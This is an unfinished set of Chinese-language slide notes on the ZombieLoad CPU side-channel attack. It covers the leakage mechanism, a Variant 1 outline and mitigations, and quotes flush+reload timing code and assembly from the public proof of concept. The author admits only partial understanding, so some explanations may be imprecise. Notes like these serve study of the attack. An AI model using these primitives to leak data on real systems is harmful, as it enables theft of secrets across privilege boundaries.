---
marp: true
paginate: true
---

    READING & NOT FINISH, NOT FULLY UNSTANDAND

# ZombieLoad

> intel对外说这是个中低风险非漏洞

---

## Summary

够泄露当前或同级逻辑cpu最近加载的值的攻击

Intel处理器中存在多种缩短 访存延迟的前递机制(forwarding mechanism)，例如，将写缓冲区(store buffer)、填写缓冲区(fill buffer)和读端口(load ports)中的有效数据及时地赋值给读操作。但在具体的实现中，Intel 认为已经提交却仍然存在于缓冲区或端口中的数据依旧有效。在后续执行过程中若发现数据失效，则刷新流水线重新执行，从而保证程序的正确性。但这种机制可能会将本不该前递的敏感数据传给攻击者，并改变微体系结构，导致信息泄露

使用cpu缓冲区与微架构错误来获取缓存中的信息，随机读取位置，无法定点，但是能够通过对获得的数据进行分析来判断是否为所需信息

---

## Attack Basic

瞬态执行攻击，观察内存的值，并存储在当前的cpu内核上。具体而言:

ZombieLoad利用的是加载缓冲区（load buffer），即当多个逻辑cpu核映射到同一物理cpu核时，加载缓冲区会被不同进程/权限同时共享。此时，若cpu进行内存存取时，首先将取出来的值放在加载缓冲区中
然而加载操作时需要微码进行辅助进行的，在复杂的微体系结构的情况之下（例如发生故障等），加载的可能是已经过时的值，虽然该操作后续可能会被发现并且撤回，但此时却产生了瞬态执行窗口，攻击者可以将泄露的值编码到微体系结构元素中（例如缓存中），进而造成了信息泄露。虽然这种攻击无法根据攻击者指定的地址选择要泄露的值，但是却为基于数据采样的瞬态执行攻击开辟了一个新的领域

例如：与以前的熔断型攻击比较，ZombieLoad不会局限于特定的权限边界。尤其是将ZombieLoad和现有的侧信道技术结合的攻击是非常强大的

---

## Reason may cause

由于每次load都与加载缓冲区中的一个条目相关联，然而当遇到一些复杂情况时(如故障处理等)，就会刷新流水线上的后续指令，但是在此之前已经运行的指令仍然会完成执行。
此时这种情况，为了避免更多额外的延迟，系统可能只要求部分物理地址匹配即可（否则可能会加大后续的指令堵塞），即填充缓冲区条目会换一种优化方式来匹配对应条目。此时，可能会导致填充缓冲区条目匹配错误。这类似于硬件中的释放后使用漏洞。因此，load指令从以前的加载或存储中加载到了有效的数据
截止于投稿之时，作者自己也不确定根本原因究竟是什么，可能不是理论上的漏洞，而是具体工程设计上的漏洞。

---

## Variant1

variant1思路: 把kernel内存刷到cache-line，然后显然会触发page fault，触发pagefault早Run回来，去flush reload，对比时间看是不是触发cache miss，cache没命中多半就是了，但根本原因是指令抢跑了

> 有两个config对复现影响比较大，一个是config_kpti 一个是config_kaslr
> 前者的作用是把你kernel页表扬了，后者是随机重定位
> kernel页表没了，预取也就无从谈起了


### Solve

variant1: 在返回用户态sigsegv之前刷新cache line

---

## Solve

由于这种跨逻辑核的泄露加载和存储的值，最简单有效的措施就是完全禁用超线程，但是会对性能产生30%-40%的影响。

文章另外提出了一些可能可行的理论方法

方法一：共同调度，当前的协同调度算法不涉及防止内核与用户空间代码并发执行，这种算法只能防止用户进程之间的泄露，但无法防止内核和用户空间之间的泄露。所以内核还必须确保一个逻辑核上的内核条目也强制只有同级逻辑核才能进入内核，以此避免内核核用户空间之间的泄露
方法二：禁用SGX、TSX、以及不需要运行虚拟机的系统上禁用VT-x
方法三：指令过滤，对于单个进程内部的攻击（如JavaScript沙盒），防止生成和执行CLFLUSH指令。以此来避免使用过时的或以及驱逐出去的值

---

## Code Analyze

```c
// userspace_linux_windows/secret.c
void maccess(void *p)
{
    asm volatile(
        "movq (%0), %%rax\n"
        :
        : "c"(p)
        : "rax");
}
```
---

```c
// variant1-linux/main.c
  int update = 0;
  for (size_t i = FROM; i <= TO; i++) {
    if (flush_reload((char *)mem + 4096 * i)) {
      hist[i]++;
      update = 1;
    }
  }
```
---

```c
// variant1-linux/main.c
int flush_reload(void *ptr) {
  uint64_t start = 0, end = 0;

#if USE_RDTSC_BEGIN_END
  start = rdtsc_begin();
#else
  start = rdtsc();
#endif
  maccess(ptr);
#if USE_RDTSC_BEGIN_END
  end = rdtsc_end();
#else
  end = rdtsc();
#endif

  mfence();

  flush(ptr);

  if (end - start < CACHE_MISS) {
    return 1;
  }
  return 0;
}
```
---

```asm
// variant1-linux/main.asm
maccess:
.LFB8:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rdx
	movq	%rdx, %rcx
#APP
# 42 "cacheutils.h" 1
	movq (%rcx), %rax

# 0 "" 2
#NO_APP
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
```
---

```asm
// variant1-linux/main.asm
flush:
.LFB7:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rdx
	movq	%rdx, %rcx
#APP
# 39 "cacheutils.h" 1
	clflush 0(%rcx)

# 0 "" 2
#NO_APP
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
```
---

## Reference

- [ZombieLoad Attack](https://zombieloadattack.com/)
- [ZombieLoad PoC - Github](https://github.com/IAIK/ZombieLoad.git)
- [GCC: Extended Asm](https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html)
- [GCC: Extended Asm (Using the GNU Compiler Collection (GCC))](https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html#x86Operandmodifiers)
- [Enable TSX - How To Make Linux System To Run Faster On Intel CPUs](https://ostechnix.com/how-to-make-linux-system-to-run-faster-on-intel-cpus/)
